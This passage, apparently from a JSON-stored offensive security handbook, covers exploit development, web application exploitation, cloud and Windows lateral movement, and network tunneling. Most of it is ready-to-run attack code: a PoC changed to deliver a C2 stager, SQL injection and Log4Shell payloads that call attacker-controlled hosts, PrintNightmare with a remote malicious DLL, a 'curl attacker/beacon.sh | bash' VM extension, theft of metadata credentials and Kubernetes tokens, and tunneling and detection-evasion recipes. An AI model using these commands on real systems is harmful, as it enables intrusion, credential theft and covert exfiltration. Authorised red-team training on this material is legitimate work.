Look for: added bounds checks, input validation, auth checks\n# The removed vulnerability is exactly what was added/fixed\n```\n\nThe window between patch and mass deployment is often 2-4 weeks — developing exploits during this window maximizes impact.\n\n### Exploit Integration with C2 Framework\n\nConvert standalone PoC exploits to deliver C2 agents rather than calc.exe:\n\n```python\n# Modified PoC with C2 stager delivery\nimport requests, base64\n\nTEAMSERVER = \"https://LHOST/api/agent\"\nAGENT_TOKEN = \"AGENT_TOKEN\"\n\ndef get_stager():\n \"\"\"Fetch staged PowerShell stager from teamserver\"\"\"\n r = requests.get(f\"{TEAMSERVER}/stager/ps1\",\n headers={\"Authorization\": f\"Bearer {AGENT_TOKEN}\"},\n verify=False)\n return base64.b64encode(r.text.encode()).decode()\n\ndef exploit_target(target_url):\n stager_b64 = get_stager()\n # Replace PoC's \"calc.exe\" command with PowerShell stager\n payload = f\"powershell -enc {stager_b64}\"\n # ... original exploit trigger code using payload\n```\n\n### Memory-Safe Exploitation Techniques\n\nModern exploits must account for Windows memory protections: ASLR, DEP/NX, CFG, and Shadow Stack. Reliable techniques for 2026:\n\n**ret2libc / ROP chains**: Bypass DEP by chaining existing code gadgets (ROP) rather than injecting shellcode. Tools: ROPgadget, ropper, pwntools.\n\n**Heap grooming**: Shape heap layout before triggering UAF or overflow to achieve deterministic object overlap. Critical for browser exploits.\n\n**CFG bypass**: Call-flow guard validates indirect calls. Bypass via:\n- Calling unprotected functions (older CRT functions)\n- Overwriting function pointers in vtables (must be to CFG-valid targets)\n- SetProcessValidCallTargets to add arbitrary addresses to CFG bitmap (requires write primitive)\n\n```python\n# pwntools ROP chain template\nfrom pwn import *\n\nelf = ELF('./target_binary')\nrop = ROP(elf)\n\n# Build chain: pop rdi; ret → /bin/sh address → system()\nrop.call('puts', [elf.got['puts']]) # leak libc\nrop.call('main') # return to main for second stage\n```\n\n### CVE Hunting via Fuzzing\n\nDiscover 0-days in network services using coverage-guided fuzzing:\n\n```bash\n# AFL++ for file format fuzzing\nafl-fuzz -i corpus/ -o findings/ -- ./target_parser @@\n\n# LibFuzzer for library targets\nclang -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c target_lib.c\n./fuzz_target corpus/\n\n# Network protocol fuzzing with Boofuzz\npython3 -c \"\nfrom boofuzz import *\ns = Session(target=Target(connection=TCPSocketConnection('TARGET_IP', 80)))\ns.connect(s.root, Request('http-request', children=(\n String('method', 'GET'),\n Delim('space', ' '),\n String('path', '/'),\n ...\n)))\ns.fuzz()\n\"\n```\n\nFuzzing discovers variants of known vulnerability classes — if a parsing bug exists in one place, similar code elsewhere is likely vulnerable too.", "last_updated": "2026-03-18"}, "web-exploitation": {"slug": "web-exploitation", "title": "Web Application Exploitation", "category": "Initial Access", "content": "# Web Application Exploitation\n\n## ◈ BEGINNER\n\n### What is Web Application Exploitation?\n\nWeb applications (websites, APIs) are among the most common attack surfaces because they're intentionally exposed to the internet. Web exploitation means finding and abusing flaws in how these applications handle user input, authentication, or data.\n\n**Key vulnerability types:**\n- **SQL Injection (SQLi)** — injecting SQL code into database queries; can read/modify databases or even run OS commands\n- **XSS (Cross-Site Scripting)** — injecting JavaScript into web pages that other users see; can steal cookies, redirect browsers\n- **SSRF (Server-Side Request Forgery)** — tricking the server into making HTTP requests on your behalf; can access internal resources\n- **XXE (XML External Entity)** — exploiting XML parsers to read local files or make outbound connections\n- **SSTI (Server-Side Template Injection)** — injecting template syntax to execute code in the server's template engine\n- **IDOR (Insecure Direct Object Reference)** — accessing resources by changing an ID (e.g., `/profile?id=123` → change `123` to another user's ID)\n- **Deserialization** — exploiting the process of converting binary/text data back to objects; often leads to RCE\n- **File upload bypass** — uploading a malicious file despite restrictions\n\n**What is a web shell?** A tiny script uploaded to a web server that lets you run commands. Once it's deployed, you access it via your browser: `https://target.com/uploads/shell.php?cmd=whoami`\n\n**Why is SSRF so powerful in cloud environments?**\nCloud servers (AWS, Azure, GCP) have a special internal URL (`169.254.169.254`) called the Instance Metadata Service (IMDS). If you can trick the server into fetching that URL, you get the cloud machine's credentials — giving access to the entire cloud account.\n\n**Analogy:** SQL injection is like a form that asks for your name, and you write `'; DROP TABLE users;--` — the database runs your code because the application didn't separate your data from its own instructions.\n\n**The key principle:** All these vulnerabilities come from one root cause — user input being used in a security-sensitive context without proper validation or escaping.\n\n## ◈ INTERMEDIATE\n\nComprehensive coverage of web application vulnerability classes for gaining initial access or pivoting deeper into target infrastructure.\n\n## SQL Injection\n\n**Detection**: Inject single quotes, boolean conditions, and time-based payloads to identify injection points.\n\n**Union-based extraction**:\n```sql\n' UNION SELECT NULL,NULL,NULL-- - -- determine column count\n' UNION SELECT 1,username,password FROM users-- -\n```\n\n**Blind Boolean**:\n```sql\n' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -\n```\n\n**Time-based Blind**:\n```sql\n-- MySQL: ' AND SLEEP(5)-- -\n-- MSSQL: ' WAITFOR DELAY '0:0:5'-- -\n-- PostgreSQL: ' AND pg_sleep(5)-- -\n```\n\n**Out-of-Band (OOB)**:\n```sql\n-- MSSQL DNS exfil\n'; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- -\n-- Oracle\n' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual-- -\n```\n\n**sqlmap** accelerates exploitation:\n```bash\nsqlmap -u \"https://target.com/page?id=1\" --level=5 --risk=3 --batch --dbs\nsqlmap -u \"https://target.com/page?id=1\" -D targetdb -T users --dump\nsqlmap -u \"https://target.com/page?id=1\" --os-shell # RCE via SQL\nsqlmap -u \"https://target.com/page?id=1\" --file-read=\"/etc/passwd\"\n```\n\n## Cross-Site Scripting (XSS)\n\n**Reflected**: Inject scripts via URL parameters that get reflected in the page response, enabling cookie theft or session hijacking.\n\n**Stored**: Inject payload into database fields rendered to other users (comments, profiles, messages).\n\n**DOM-based**: Exploit client-side sinks (innerHTML, eval, setTimeout) via sources (location.hash, URL parameters, postMessage).\n\n**CSP Bypass**: When Content-Security-Policy restricts inline scripts, use JSONP endpoints on allowed CDNs, Angular template injection, or script gadgets in allowed libraries.\n\n## Server-Side Request Forgery (SSRF)\n\nForce the server to make requests to internal resources:\n\n```\nhttps://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttps://target.com/fetch?url=http://127.0.0.1:8080/admin\nhttps://target.com/fetch?url=file:///etc/passwd\n```\n\n**Filter bypasses**: Use decimal IP (2130706433 = 127.0.0.1), IPv6 ([::1]), DNS rebinding, URL encoding, @ redirects, or alternate schemes.\n\n**AWS IMDSv1** is the highest-impact SSRF target, yielding temporary IAM credentials. IMDSv2 requires a PUT with TTL header, blocking simple SSRF.\n\n## XML External Entity (XXE)\n\n```xml\n\n\n]>\n&xxe;\n```\n\nBlind XXE via OOB: use a malicious DTD hosted on attacker server to exfiltrate file content via HTTP or DNS.\n\n## Server-Side Template Injection (SSTI)\n\nDetect with polyglot: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. If the response contains 49, the template engine evaluates input.\n\n**Jinja2 (Python)**: Access os module through class hierarchy traversal to execute commands.\n\n**Twig (PHP)**: Register callback functions to achieve code execution.\n\n**FreeMarker (Java)**: Instantiate the Execute utility class for command execution.\n\n## Deserialization\n\n**Java**: Use ysoserial to generate gadget chain payloads. Identify deserialization by finding magic bytes `ac ed 00 05` in traffic or base64-encoded variants.\n\n**PHP**: `unserialize()` with magic methods (__wakeup, __destruct). PHPGGC generates gadget chains.\n\n**.NET**: BinaryFormatter, XmlSerializer, JavaScriptSerializer with TypeNameHandling. Use ysoserial.net.\n\n## File Upload Bypass\n\nTechniques to bypass upload restrictions:\n- Extension bypass: `.php5`, `.phtml`, `.php.jpg`, `.php%00.jpg` (null byte)\n- Content-Type manipulation: Change to `image/jpeg` while uploading PHP\n- Magic bytes: Prepend `GIF89a` to PHP file\n- Polyglot files: Valid JPEG that is also valid PHP\n- .htaccess upload: Add handler directive then upload PHP with allowed extension\n- Case variation: `.PhP`, `.PHP`\n\n## JWT Attacks\n\n```bash\n# None algorithm attack\njwt_tool TOKEN -X a\n\n# Algorithm confusion (RS256 to HS256 — sign with public key as HMAC secret)\njwt_tool TOKEN -X k -pk public.pem\n\n# Weak secret brute force\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n\n# kid parameter path traversal\njwt_tool TOKEN -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"\n```\n\n## IDOR and Authorization Flaws\n\n**BOLA (Broken Object Level Authorization)**: Change resource IDs in API requests to access other users' data. Test sequential IDs, UUIDs (enumerate via other endpoints), and encoded/hashed IDs.\n\n**BFLA (Broken Function Level Authorization)**: Access admin endpoints as regular user, change HTTP methods (GET to PUT/DELETE), modify role parameters in request body.\n\n## Command Injection\n\n```bash\n# Basic\n; id\n| id\n`id`\n$(id)\n\n# Blind (time-based)\n; sleep 5\n| ping -c 5 127.0.0.1\n\n# Filter bypass\n;{cat,/etc/passwd}\n;cat${IFS}/etc/passwd\n;cat$IFS/etc/passwd\n```\n\n## OpSec Notes\n\n- Use targeted payloads rather than automated scanners to minimize log footprint\n- Test injection payloads in a lab replica before targeting production\n- SSRF exploitation against metadata services may trigger cloud security alerts\n- Deserialization exploits may crash the application — verify stability first\n- Always capture evidence (screenshots, request/response) for the engagement report\n\n## High-Impact CVE Examples\n\n### Log4Shell (CVE-2021-44228)\n\n```bash\n# Test for Log4Shell: inject JNDI string in any logged field\ncurl -H 'X-Api-Version: ${jndi:ldap://attacker.io:1389/a}' https://target.com/\n\n# Full exploitation with JNDI-Exploit-Kit\njava -jar JNDI-Exploit-Kit.jar -C \"curl http://attacker.io/$(whoami)\"\n\n# Affected: Log4j 2.0-beta9 through 2.14.1\n# Vectors: virtually any field that gets logged\n```\n\n### PrintNightmare (CVE-2021-1675 / 34527)\n\n```powershell\n# Impacket exploit\npython3 CVE-2021-1675.py corp.local/user:pass@192.168.1.20 '\\\\attacker\\share\\evil.dll'\n\n# Local privilege escalation via PowerShell\nImport-Module .\\CVE-2021-1675.ps1\nInvoke-Nightmare -DriverName \"PrintMe\" -NewUser \"hacker\" -NewPassword \"P@ss123\"\n```\n\n## ◈ ADVANCED\n\n### Second-Order and Stored Attack Chains\n\nMany modern applications sanitize input on entry but render it unsanitized later. Test second-order injection:\n\n```sql\n-- Register with username: admin'--\n-- Later: SELECT * FROM users WHERE username='admin'--' AND password='...'\n-- The stored payload executes in a different query context\n\n-- Second-order SQLi via profile name stored and later used in backup query:\n-- Username: '; INSERT INTO admin_users VALUES('hacker','hash');--\n-- Triggered when admin generates user report\n```\n\n### SSRF to IMDSv2 Bypass\n\nAWS IMDSv2 requires a PUT request with `X-aws-ec2-metadata-token-ttl-seconds` header. Standard SSRF (GET-only) won't work, but SSRFs in applications that support redirects or PUT methods can be exploited:\n\n```python\n# If the SSRF allows following redirects through a local server you control:\n# Step 1: Set up a redirect server that responds:\n# HTTP/1.1 307 Temporary Redirect\n# Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n\n# With 307 redirect (not 302): browser sends same method (PUT) to destination\n# This satisfies IMDSv2's PUT requirement via SSRF\n\n# After getting token:\n# GET http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# X-aws-ec2-metadata-token: \n```\n\n### GraphQL Authorization Bypass Chains\n\nGraphQL APIs are commonly misconfigured. Deep exploitation chains:\n\n```graphql\n# 1. Introspection to find mutations\nquery { __schema { mutationType { fields { name args { name } } } } }\n\n# 2. Find admin mutation not protected by role check\nmutation {\n updateUserRole(userId: \"123\", role: \"ADMIN\") {\n success\n user { id role }\n }\n}\n\n# 3. Nested query abuse — extract data through relationship traversal\nquery {\n myProfile {\n orders {\n user {\n creditCards {\n number cvv\n }\n }\n }\n }\n}\n```\n\nGraphQL often lacks field-level authorization — each resolver must explicitly check permissions.\n\n### WAF Bypass Techniques (2026)\n\nModern WAFs use ML-based detection. Bypass strategies:\n\n```\n1. Encoding chains: UTF-8 → URL encode → hex encode → double-encode\n ' OR 1=1-- → %27%20OR%201%3d1--\n\n2. Case/comment mixing (SQL):\n SeLeCt/**/uSeRnAmE/**/fRoM/**/uSeRs\n\n3. HTTP/2 header injection (smuggling):\n Use H2 pseudo-headers with unusual capitalization\n\n4. Chunked transfer encoding to fragment WAF inspection window\n\n5. Request splitting via content-type boundary manipulation\n\n6. Multipart body injection — WAF inspects first part, payload in second\n```\n\nTarget WAF models (Cloudflare, Akamai, Imperva) all have public bypass research — search for `{WAF_NAME} bypass 2025` before manual testing.\n\n### Race Condition Exploitation\n\nModern web apps have time-of-check to time-of-use (TOCTOU) vulnerabilities exploitable via concurrent requests:\n\n```python\nimport threading, requests\n\nSESSION = requests.Session()\nSESSION.headers[\"Authorization\"] = \"Bearer USER_TOKEN\"\n\ndef spend_coupon():\n return SESSION.post(\"https://target.com/api/redeem\",\n json={\"coupon\": \"SAVE50\", \"order_id\": \"12345\"})\n\n# Fire 50 concurrent requests — race to apply the coupon multiple times\nthreads = [threading.Thread(target=spend_coupon) for _ in range(50)]\n[t.start() for t in threads]\n[t.join() for t in threads]\n```\n\nUse Burp Suite's \"Send group in parallel\" (Turbo Intruder) for HTTP/2 single-packet attack — sends all requests in one TCP segment, minimizing network jitter and maximizing race window.", "last_updated": "2026-03-18"}, "cloud-lateral": {"slug": "cloud-lateral", "title": "Cloud Lateral Movement", "category": "Lateral Movement", "content": "# Cloud Lateral Movement\n\n## ◈ BEGINNER\n\n### What is Cloud Lateral Movement?\n\nCloud lateral movement is the process of using access to one cloud resource to reach other, more privileged resources within the same cloud account (or across accounts). Unlike traditional networks where you move between physical machines, cloud lateral movement often involves escalating privileges through IAM roles, identity tokens, and service-to-service trust relationships.\n\n**Why is cloud lateral movement different?**\nIn traditional networks, the perimeter is mostly physical — you need network access. In cloud environments, everything is API-based. A compromised virtual machine with an overprivileged IAM role can access storage, databases, secrets, and other machines — often without any network-level restrictions.\n\n**Key terms:**\n- **IAM** — Identity and Access Management; the cloud's permission system\n- **IAM role** — a set of permissions that can be assumed by cloud resources, users, or services\n- **AssumeRole** — AWS mechanism for a resource to temporarily become another identity with different permissions\n- **Managed Identity** — Azure's equivalent of IAM role; automatically provides credentials to Azure VMs\n- **IMDS** — Instance Metadata Service; an HTTP endpoint (169.254.169.254) accessible from within VMs that provides credentials for the instance's role/identity\n- **Service Account** — GCP's identity for VMs and services; keys and tokens allow impersonating the account\n- **Cross-account role** — a role in Account B that trusts entities from Account A; enables pivoting between AWS accounts\n\n**The cloud lateral movement mindset:**\n1. Compromise a resource (EC2, Azure VM, Lambda function)\n2. Query the metadata service for credentials\n3. Enumerate what those credentials can access (other VMs, S3 buckets, Key Vaults, secrets)\n4. Use high-privilege operations (AssumeRole, RunCommand, Key Vault read) to expand access\n5. Move toward the most privileged identity (Admin role, Owner subscription, cluster-admin)\n\n**Analogy:** In a traditional building, lateral movement requires unlocking doors. In a cloud environment, it's more like using an employee badge that automatically opens different areas depending on which department issued it — and you can sometimes escalate by borrowing a badge from a higher-privilege department.\n\n## ◈ INTERMEDIATE\n\nMoving between cloud resources and services after initial compromise, exploiting IAM misconfigurations, trust relationships, and metadata services.\n\n## AWS Lateral Movement\n\n**Role Chaining (AssumeRole)**:\n```bash\n# Enumerate roles the current identity can assume\naws iam list-roles | jq '.Roles[] | {RoleName, Arn, AssumeRolePolicyDocument}'\n\n# Assume a cross-account or same-account role\naws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name pivot\nexport AWS_ACCESS_KEY_ID=\nexport AWS_SECRET_ACCESS_KEY=\nexport AWS_SESSION_TOKEN=\n```\n\n**EC2 Instance Profile Pivot**:\n```bash\n# From compromised EC2, get instance profile credentials\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName\n\n# Use credentials to access other AWS services\naws s3 ls\naws ec2 describe-instances\naws lambda list-functions\n```\n\n**SSM Session Manager** — agentless shell to EC2 instances:\n```bash\naws ssm start-session --target i-0123456789abcdef0\n# Requires ssm:StartSession permission and SSM agent on target\n```\n\n**Lambda Abuse**:\n```bash\n# If lambda:CreateFunction + iam:PassRole, create function with high-priv role\naws lambda create-function --function-name pivot --runtime python3.9 \\\n --role arn:aws:iam::123456789012:role/AdminRole \\\n --handler lambda_function.handler --zip-file fileb://payload.zip\naws lambda invoke --function-name pivot /tmp/output.json\n```\n\n## Azure / Entra ID Lateral Movement\n\n**Managed Identity Pivot**:\n```bash\n# From compromised Azure VM, get managed identity token\ncurl -H \"Metadata: true\" \\\n \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"\n\n# Use token to enumerate and access Azure resources\naz login --identity\naz resource list\naz vm run-command invoke -g ResourceGroup -n VMName --command-id RunShellScript --scripts \"whoami\"\n```\n\n**Key Vault Secret Exfiltration**:\n```bash\naz keyvault list\naz keyvault secret list --vault-name TargetVault\naz keyvault secret show --vault-name TargetVault --name admin-password\n```\n\n**Subscription Hopping**:\n```bash\naz account list # List all accessible subscriptions\naz account set --subscription \"Target-Sub-ID\"\naz resource list # Enumerate resources in new subscription\n```\n\n## GCP Lateral Movement\n\n**Service Account Key Generation**:\n```bash\n# If iam.serviceAccountKeys.create permission exists\ngcloud iam service-accounts keys create key.json --iam-account=sa@project.iam.gserviceaccount.com\ngcloud auth activate-service-account --key-file=key.json\n```\n\n**GCE Metadata Service**:\n```bash\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/project/attributes/\n```\n\n## Kubernetes Lateral Movement\n\n**Pod Escape to Node**:\n```bash\n# From privileged pod or pod with hostPath mount\nmount /dev/sda1 /mnt\nchroot /mnt\n\n# From pod with hostPID\nnsenter -t 1 -m -u -i -n -p -- /bin/bash\n```\n\n**RBAC Escalation**:\n```bash\n# If create ClusterRoleBinding is allowed\nkubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default\n\n# Service account token theft\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\n```\n\n**etcd Direct Access** (if unauthenticated):\n```bash\netcdctl --endpoints=http://etcd-host:2379 get / --prefix --keys-only\netcdctl get /registry/secrets/default/admin-creds\n```\n\n## Cross-Cloud Pivoting\n\nWhen organizations use multiple cloud providers:\n- **OIDC Federation** — exploit trust relationships between AWS roles and GCP/Azure workload identity\n- **Shared credentials** — API keys or service principals used across providers\n- **CI/CD pipelines** — GitHub Actions, GitLab CI, Azure DevOps may have credentials for multiple clouds\n- **Terraform state files** — may contain credentials for multiple providers in plaintext\n\n## OpSec Notes\n\n- Cloud API calls are logged (CloudTrail, Azure Activity Log, GCP Audit Logs)\n- Use sts:AssumeRole with minimal duration to reduce credential exposure window\n- Metadata service access from EC2 is not logged in CloudTrail but may be monitored by cloud workload protection\n- VM Run Command generates Azure Activity Log entries\n- Kubernetes audit logs capture all API server interactions\n- Use existing role trust relationships rather than creating new ones — avoid creating new IAM users/roles\n\n## ◈ ADVANCED\n\n### AWS Role Chain Amplification\n\nSingle roles can be leveraged in chains to reach more privileged roles:\n\n```bash\n# Use Pacu for automated AWS attack path enumeration\npython3 pacu.py\n> import_keys\n> run iam__privesc_scan\n\n# Manual enumeration of assume-role paths\n# Find roles this identity can assume\naws iam simulate-principal-policy \\\n --policy-source-arn \"arn:aws:iam::123456789012:role/CurrentRole\" \\\n --action-names \"sts:AssumeRole\" \\\n --resource-arns \"*\"\n\n# Find which roles trust the current identity\naws iam list-roles | python3 -c \"\nimport json,sys\nroles = json.load(sys.stdin)['Roles']\nfor r in roles:\n doc = r['AssumeRolePolicyDocument']\n for stmt in doc['Statement']:\n principal = stmt.get('Principal', {})\n if '123456789012' in str(principal) or 'ec2.amazonaws.com' in str(principal):\n print(r['RoleName'], r['Arn'])\n\"\n```\n\n### Abusing OIDC Federation for Cross-Account Access\n\nGitHub Actions, GitLab CI, and other OIDC providers can assume AWS roles directly — no long-lived credentials needed:\n\n```bash\n# Find roles trusting GitHub OIDC\naws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Federated // \"\" | contains(\"token.actions.githubusercontent.com\")) | .RoleName'\n\n# If you control a GitHub repository that a role trusts:\n# Create workflow that calls aws sts assume-role → escalates to that role\n# The trust policy may not be scoped to specific repos\n\n# Example misconfigured trust policy (trusts ANY GitHub repo):\n# \"Condition\": {\"StringLike\": {\"token.actions.githubusercontent.com:sub\": \"repo:*:*\"}}\n```\n\n### Azure Resource Manager Template Injection\n\nARM templates can be used to execute code via custom script extensions if you have Contributor access:\n\n```bash\n# Deploy a VM extension that executes a script\naz vm extension set \\\n --resource-group TargetRG \\\n --vm-name TargetVM \\\n --name CustomScriptExtension \\\n --publisher Microsoft.Compute \\\n --settings '{\"commandToExecute\":\"curl http://attacker/beacon.sh | bash\"}'\n```\n\n### Kubernetes Privilege Escalation via Service Account Tokens\n\nWhen exec into a privileged container or pod with a high-value service account:\n\n```bash\n# Extract token and use it from outside the cluster\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nCA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | base64 -w0)\n\n# From external attacker machine:\nkubectl --token=$TOKEN --certificate-authority=/tmp/ca.crt --server=https://k8s-api:6443 get secrets -A\n\n# Escalate via service account that can create pods\nkubectl --token=$TOKEN create -f - <\n\n# Start SOCKS proxy\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun -j\n\n# Port forwarding\nportfwd add -l 3389 -p 3389 -r internal_target\n```\n\n## DNS Tunneling\n\nBypasses most firewall rules since DNS (port 53) is almost always allowed:\n\n```bash\n# iodine — IP-over-DNS tunnel\n# On attacker (authoritative DNS for tunnel domain)\niodined -f -c -P password 10.53.53.1 tunnel.attacker.com\n\n# On pivot host\niodine -f -P password tunnel.attacker.com\n# Creates a tun0 interface with IP in 10.53.53.0/24\n\n# dnscat2 — encrypted C2 over DNS\ndnscat2-server tunnel.attacker.com # server\ndnscat2 tunnel.attacker.com # client\n```\n\nDNS tunneling is slow (limited by DNS packet size and latency) but extremely effective at bypassing egress filtering.\n\n## ICMP Tunneling\n\n```bash\n# ptunnel-ng — TCP-over-ICMP\n# On attacker\nptunnel-ng -r pivot_host -R 22\n\n# On pivot host\nptunnel-ng\n\n# Then SSH through the ICMP tunnel\nssh -p 2222 user@127.0.0.1\n```\n\nICMP tunneling works when all TCP/UDP egress is blocked but ICMP echo (ping) is allowed.\n\n## Web Shell Tunnels\n\nWhen only HTTP is available (compromised web server):\n\n```bash\n# Neo-reGeorg — SOCKS proxy through web shell\npython3 neoreg.py generate -k password\n# Upload tunnel.php to target web server\n\npython3 neoreg.py -k password -u http://target.com/tunnel.php\n# Creates local SOCKS proxy on 127.0.0.1:1080\n```\n\n## Windows-Specific Tunneling\n\n```cmd\n:: plink.exe (PuTTY command-line SSH)\nplink.exe -ssh -l user -pw password -R 9090:127.0.0.1:3389 attacker_ip\n\n:: netsh port proxy (built-in, no tools needed)\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal_target\n\n:: View current portproxy rules\nnetsh interface portproxy show all\n\n:: Remove portproxy\nnetsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0\n```\n\n## Double Pivoting\n\nChain pivots through multiple network segments:\n\n```\nAttacker → Pivot1 (DMZ) → Pivot2 (Internal) → Target (Restricted)\n\n# SSH chain\nssh -J user1@pivot1,user2@pivot2 user3@target\n\n# Chisel chain\n# Pivot1: chisel client attacker:8080 R:socks\n# Pivot2 (through proxychains): chisel client pivot1_tunnel:8080 R:socks\n# Stack SOCKS proxies in proxychains.conf\n\n# Ligolo-ng with multiple agents\n# Add routes for each segment through the appropriate agent\n```\n\n## ProxyChains Configuration\n\n```ini\n# /etc/proxychains4.conf\nstrict_chain\nproxy_dns\n\n[ProxyList]\nsocks5 127.0.0.1 1080\n# For double pivot, add second proxy:\n# socks5 127.0.0.1 1081\n```\n\n## OpSec Notes\n\n- SSH tunnels are encrypted but SSH connections to unusual destinations generate alerts\n- Chisel over HTTPS blends with web traffic better than raw SSH\n- DNS tunneling generates high query volumes to a single domain — detectable by DNS analytics\n- Ligolo-ng traffic pattern is distinctive — use HTTPS mode when possible\n- netsh portproxy entries persist across reboots and are easily discovered during forensics\n- Clear iptables rules and netsh portproxy entries during cleanup\n\n## ◈ ADVANCED\n\n### C2 Beacon as Pivot Point\n\nModern C2 frameworks support proxying attack tool traffic through implants without a separate tunnel:\n\n```\nCobalt Strike: socks 1080 → proxychains through beacon\nSliver: socks5 start --host 127.0.0.1 --port 1080\nHavoc: socks proxy through demon session\n\nAdvantage: no separate tunnel binary to transfer/detect\nTraffic rides inside established C2 channel\nCovert channel already using HTTPS/DNS — pivoted traffic inherits same evasion\n```\n\n### Reverse Port Forward via Named Pipes (Windows SMB)\n\nWhen HTTP egress is blocked but SMB port 445 is open (common in internal segments):\n\n```\nSMB-based C2 channels can carry tunneled traffic:\n1. Parent implant has HTTP/DNS C2 to internet\n2. Child implants in internal segments use SMB named pipe transport to parent\n3. Parent proxies all traffic to teamserver over its established channel\n4. Entire chain: teamserver → HTTPS → parent → SMB pipe → child\n```\n\n### Application-Layer Tunneling via Cloud Services\n\nWhen traditional tunneling is blocked but cloud APIs are permitted:\n\n```\nOneDrive/SharePoint C2: poll files from OneDrive for commands, post results to SharePoint\nTeams webhook: use Teams incoming webhook as data channel\nGitHub/GitLab: poll issues/commits for commands, post results as comments\nAWS S3: put/get objects from S3 bucket as C2 channel\n\nAdvantage: all traffic goes to legitimate cloud domains\nFirewall sees only Microsoft/GitHub/Amazon traffic\nDLP and proxy bypass: cloud services often whitelisted entirely\n```\n\n### IPv6 Tunneling (6to4 and Teredo)\n\nMany organizations filter IPv4 traffic carefully but overlook IPv6:\n\n```bash\n# If target has IPv6 but only IPv4 egress filtering:\n# Use Teredo (IPv6 over UDP to Teredo server) or 6in4 tunnel\n\n# Check for IPv6 addresses\nip -6 addr\n# If link-local address present, test reachability\nping6 -I eth0 fe80::1%eth0\n\n# Miredo (Teredo client for Linux) — IPv6 connectivity over UDP\nmiredo\n# Creates a teredo interface with global IPv6 address\n```\n\n### Traffic Shaping for Tunnel Detection Evasion\n\nTunneling generates distinctive traffic patterns (constant payload size, regular intervals, high entropy):\n\n```\nDetection signatures:\n- iodine/dnscat: high DNS query volume, long DNS labels, non-existent domains\n- Chisel: WebSocket upgrade requests to non-browser processes\n- Ligolo-ng: TLS to non-standard port, persistent connection\n\nEvasion:\n1. Use HTTP/2 over port 443 with valid certificate\n2. Add jitter to tunnel keepalives (irregular intervals)\n3. Fragment large transfers into small chunks with random delays\n4. Use legitimate cloud infrastructure as tunnel relay\n5. Mirror user-agent strings from popular browsers\n```\n\n### Covert Tunneling via Protocol Abuse\n\nProtocols with large payload headroom available for covert data transport:\n\n- **HTTPS** — most versatile; blend with legitimate browsing\n- **DNS over HTTPS (DoH)** — DNS queries via HTTPS to 8.8.8.8; bypasses DNS inspection\n- **ICMP payload** — up to 65,507 bytes per packet; nearly never filtered on egress\n- **TCP timestamps** — encode data in TCP timestamp options; tiny bandwidth but extremely covert\n- **HTTP/2 push** — server push frames carry arbitrary data; difficult to inspect at scale", "last_updated": "2026-03-18"}, "windows-lateral": {"slug": "windows-lateral", "title": "Windows Lateral Movement", "category": "Lateral Movement", "content": "# Windows Lateral Movement\n\n## ◈ BEGINNER\n\n### What is Lateral Movement?\n\nAfter compromising one machine in a network, lateral movement is the process of using that access to reach other machines. The goal is to spread through the network until you reach high-value targets — servers containing sensitive data, Domain Controllers, or systems with privileged accounts.\n\n**Why is it necessary?**\nThe first machine you compromise is rarely the most valuable. You might land on a developer workstation, but the target is the database server in a different subnet. Lateral movement is how you bridge that gap.\n\n**Key concepts:**\n- **Credential reuse** — the same password or hash used on multiple machines; compromise one, get access to many\n- **Admin shares** — hidden network shares (C$, ADMIN$, IPC$) accessible to local administrators\n- **Pass-the-Hash (PtH)** — using a captured NTLM hash to authenticate without knowing the password\n- **Pass-the-Ticket (PtT)** — using a captured Kerberos ticket to authenticate\n- **Overpass-the-Hash** — converting an NTLM hash into a Kerberos ticket\n- **Token stealing** — after gaining admin access on a machine, stealing the access tokens of other users currently logged in\n\n**Why does Windows make lateral movement easy?**\nWindows networks are designed for seamless resource sharing. SMB (file sharing), WMI (remote management), WinRM (PowerShell remoting), and RDP (remote desktop) all exist to help administrators manage machines remotely. Attackers abuse the same mechanisms with captured credentials.\n\n**The typical lateral movement flow:**\n1. Compromise machine A, dump credentials/tokens\n2. Find that the same admin password works on machine B (credential reuse)\n3. Authenticate to machine B via SMB/WMI/WinRM using the captured hash\n4. On machine B, find a logged-in Domain Admin\n5. Steal the Domain Admin's token or dump their credentials\n\n**Analogy:** You break into an office building and find a master keycard in a desk. Lateral movement is using that keycard to move from office to office — stopping in each one to look for more useful things.\n\n## ◈ INTERMEDIATE\n\nTechniques for moving between Windows hosts after initial compromise, using various protocols and execution methods.\n\n## PsExec / Impacket\n\nCreates a service on the remote host via SMB, executes the command, then removes the service:\n\n```bash\n# Impacket psexec.py (drops binary, creates service)\npsexec.py target.local/admin:password@10.0.0.5\npsexec.py -hashes :NTLM_HASH target.local/admin@10.0.0.5\n\n# Impacket smbexec.py (no binary drop — uses cmd.exe via service)\nsmbexec.py target.local/admin:password@10.0.0.5\n\n# SysInternals PsExec\nPsExec.exe \\\\10.0.0.5 -u admin -p password -s cmd.exe\nPsExec.exe \\\\10.0.0.5 -accepteula -s -d 